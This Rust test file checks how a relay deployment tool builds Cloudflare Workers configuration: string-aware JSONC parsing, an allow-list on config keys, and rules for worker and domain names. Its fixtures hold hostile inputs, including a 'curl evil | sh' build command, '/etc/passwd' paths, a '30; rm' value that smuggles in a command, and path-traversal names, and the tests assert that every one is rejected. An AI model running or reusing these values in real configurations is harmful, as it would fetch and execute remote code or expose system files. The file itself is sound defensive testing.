//! Generated config (spec 11.1 `config`, 4.3): allow-list, string-aware JSONC, name rules, no account id, custom domain.

mod common;

use std::fs;

use common::*;
use intely_relay_deploy::config::*;
use intely_relay_deploy::kit::{parse_jsonc, strip_jsonc, RelayKit};
use serde_json::Value;

fn snapshot_of(kit: &RelayKit, tmp: &std::path::Path) -> intely_relay_deploy::kit::Snapshot {
    kit.snapshot_src(&tmp.join("w/kit")).unwrap()
}

#[test]
fn the_jsonc_reader_keeps_comment_markers_inside_strings() {
    let v = parse_jsonc(&repo_wrangler_jsonc()).unwrap();
    assert_eq!(v["assets"]["run_worker_first"][0], "/r/*", "the file holds /* inside a string value");
    assert_eq!(v["assets"]["run_worker_first"][1], "/api/*");
    let t = r#"{ "a": "x // not a comment", /* block */ "b": "/* nor this */", "c": [1, 2, ], // trailing
       "d": "esc \" // still string", }"#;
    let v = parse_jsonc(t).unwrap();
    assert_eq!(v["a"], "x // not a comment");
    assert_eq!(v["b"], "/* nor this */");
    assert_eq!(v["c"].as_array().unwrap().len(), 2);
    assert_eq!(v["d"], "esc \" // still string");
    assert_eq!(strip_jsonc("{\"u\":\"a,\\\"]\"}"), "{\"u\":\"a,\\\"]\"}");
}

#[test]
fn the_config_is_built_from_the_allow_list_only() {
    let tmp = tempfile::tempdir().unwrap();
    let kit = make_kit(&tmp.path().join("kit"));
    let snap = snapshot_of(&kit, tmp.path());
    let hostile = r#"{
      "name": "evil", "main": "/etc/passwd", "account_id": "deadbeef", "compatibility_date": "2026-09-01",
      "compatibility_flags": ["nodejs_compat"], "routes": [{"pattern": "evil.example.com/*"}],
      "kv_namespaces": [{"binding":"K","id":"x"}], "r2_buckets": [{"binding":"R","bucket_name":"b"}],
      "services": [{"binding":"S","service":"other"}], "send_metrics": true, "dev": {"port": 1}, "build": {"command": "curl evil | sh"},
      "triggers": {"crons": ["* * * * *"]}, "tail_consumers": [{"service":"x"}], "logpush": true,
      "observability": {"enabled": true}, "workers_dev": false, "preview_urls": true,
      "assets": {"directory": "/etc", "binding": "ASSETS", "html_handling": "auto-trailing-slash", "not_found_handling": "single-page-application", "run_worker_first": ["/r/*"], "evil": 1},
      "durable_objects": {"bindings": [{"name":"ROOM","class_name":"Room","script_name":"other-worker"}]},
      "migrations": [{"tag":"v1","new_sqlite_classes":["Room"],"deleted_classes":["Old"]}],
      "vars": {"JOIN_RATE_PER_MIN": "30", "SECRET_THING": "x", "RELAY_STAMP": "spoofed"}
    }"#;
    let (text, resources, hash) = build(hostile, "my-relay-0123456789ab", &snap, &ConfigOpts { custom_domain: None, stamp: "0123456789abcdef".into() }).unwrap();
    let v: Value = serde_json::from_str(&text).unwrap();
    let keys: Vec<&str> = v.as_object().unwrap().keys().map(String::as_str).collect();
    assert_eq!(keys, vec!["assets", "compatibility_date", "durable_objects", "main", "migrations", "name", "observability", "preview_urls", "vars", "workers_dev"]);
    assert_eq!(v["name"], "my-relay-0123456789ab");
    assert_eq!(v["main"], "kit/src/index.ts");
    assert_eq!(v["assets"]["directory"], "dist");
    assert!(v["assets"].get("evil").is_none());
    assert_eq!(v["observability"]["enabled"], false);
    assert_eq!(v["workers_dev"], true);
    assert_eq!(v["preview_urls"], false);
    assert!(v["durable_objects"]["bindings"][0].get("script_name").is_none());
    assert!(v["migrations"][0].get("deleted_classes").is_none());
    assert_eq!(v["migrations"][0]["tag"], "v1");
    let vars = v["vars"].as_object().unwrap();
    assert_eq!(vars["JOIN_RATE_PER_MIN"], "30");
    assert_eq!(vars["RELAY_STAMP"], "0123456789abcdef", "the tooling's stamp wins over the kit's value");
    assert_eq!(vars["RELAY_CODE_HASH"], hash.as_str());
    assert!(!vars.contains_key("SECRET_THING"));
    assert!(!text.contains("account_id") && !text.contains("evil") && !text.contains("/etc"));
    assert!(resources.iter().any(|r| r.kind == "durableObject" && r.label.starts_with("Room") && r.detail.is_some() && !r.label.contains('(')));
    assert!(resources.iter().any(|r| r.kind == "routeWorkersDev" && r.label.is_empty()));
}

#[test]
fn the_real_kit_config_round_trips_with_the_migration_tag_untouched() {
    let tmp = tempfile::tempdir().unwrap();
    let kit = make_kit(&tmp.path().join("kit"));
    let snap = snapshot_of(&kit, tmp.path());
    let cfg = generate(&kit, "intely-relay-0123456789ab", &snap, &tmp.path().join("w"), &ConfigOpts { custom_domain: None, stamp: "0123456789abcdef".into() }).unwrap();
    let v: Value = serde_json::from_str(&fs::read_to_string(&cfg.path).unwrap()).unwrap();
    assert_eq!(v["migrations"][0]["tag"], "v1");
    assert_eq!(v["migrations"][0]["new_sqlite_classes"], serde_json::json!(["Room", "JoinLimiter"]));
    assert_eq!(v["assets"]["run_worker_first"], serde_json::json!(["/r/*", "/api/*"]));
    assert_eq!(v["durable_objects"]["bindings"].as_array().unwrap().len(), 2);
    assert_eq!(cfg.text, fs::read_to_string(&cfg.path).unwrap());
    // the kit's own file is never modified
    assert_eq!(fs::read_to_string(kit.relay_dir.join("wrangler.jsonc")).unwrap(), repo_wrangler_jsonc());
    // the code hash is deterministic and depends on the source
    let again = generate(&kit, "intely-relay-0123456789ab", &snap, &tmp.path().join("w"), &ConfigOpts { custom_domain: None, stamp: "0123456789abcdef".into() }).unwrap();
    assert_eq!(cfg.relay_code_hash, again.relay_code_hash);
    fs::write(kit.relay_dir.join("src/config.ts"), "export const PROTOCOL = \"changed\";\n").unwrap();
    let snap2 = snapshot_of(&kit, tmp.path());
    let changed = generate(&kit, "intely-relay-0123456789ab", &snap2, &tmp.path().join("w"), &ConfigOpts { custom_domain: None, stamp: "0123456789abcdef".into() }).unwrap();
    assert_ne!(cfg.relay_code_hash, changed.relay_code_hash);
}

#[test]
fn custom_domain_adds_routes_and_turns_workers_dev_off() {
    let tmp = tempfile::tempdir().unwrap();
    let kit = make_kit(&tmp.path().join("kit"));
    let snap = snapshot_of(&kit, tmp.path());
    let cfg = generate(&kit, "relay", &snap, &tmp.path().join("w"), &ConfigOpts { custom_domain: Some("relay.example.com".into()), stamp: String::new() }).unwrap();
    let v: Value = serde_json::from_str(&cfg.text).unwrap();
    assert_eq!(v["workers_dev"], false);
    assert_eq!(v["routes"], serde_json::json!([{"pattern": "relay.example.com", "custom_domain": true}]));
    assert!(cfg.resources.iter().any(|r| r.kind == "route" && r.label == "relay.example.com"));
    for bad in ["", "localhost", "Relay.Example.com", "relay..example.com", "-a.example.com", "a.example.com/", "1.2.3.4", "x.workers.dev", "räl.example.com", "relay.example.com:8443", &"a".repeat(64)] {
        assert_eq!(validate_custom_domain(bad).unwrap_err().code(), "nameInvalid", "{bad:?}");
    }
    assert!(validate_custom_domain("relay.example.com").is_ok());
}

#[test]
fn worker_name_rules() {
    for ok in ["a", "intely-relay-0123456789ab", "x1", &"a".repeat(63)] {
        assert!(validate_worker_name(ok).is_ok(), "{ok}");
    }
    for bad in ["", "-a", "a-", "Abc", "a_b", "a.b", "a b", "räl", &"a".repeat(64), "a/b", "../x", "a\nb"] {
        assert_eq!(validate_worker_name(bad).unwrap_err().code(), "nameInvalid", "{bad:?}");
    }
    assert_eq!(default_worker_name(&[1, 2, 3, 4, 5, 6]), "intely-relay-010203040506");
    assert!(validate_worker_name(&default_worker_name(&[255; 6])).is_ok());
    assert!(name_is_guessable("my-relay") && name_is_guessable("a"));
    assert!(!name_is_guessable("intely-relay-0123456789ab"));
}

#[test]
fn hostile_kit_values_are_refused_not_copied() {
    let tmp = tempfile::tempdir().unwrap();
    let kit = make_kit(&tmp.path().join("kit"));
    let snap = snapshot_of(&kit, tmp.path());
    let opts = ConfigOpts::default();
    let cases = [
        r#"{"compatibility_date": "tomorrow"}"#,
        r#"{"compatibility_date": "2026-09-01", "assets": {"html_handling": "evil"}}"#,
        r#"{"compatibility_date": "2026-09-01", "assets": {"run_worker_first": ["http://evil"]}}"#,
        r#"{"compatibility_date": "2026-09-01", "durable_objects": {"bindings": [{"name": "A B", "class_name": "X"}]}}"#,
        r#"{"compatibility_date": "2026-09-01", "migrations": [{"tag": "v 1"}]}"#,
        r#"{"compatibility_date": "2026-09-01", "vars": {"JOIN_RATE_PER_MIN": "30; rm"}}"#,
        "not json at all",
    ];
    for c in cases {
        assert!(build(c, "relay", &snap, &opts).is_err(), "{c}");
    }
    assert!(build(&repo_wrangler_jsonc(), "Bad Name", &snap, &opts).is_err());
}
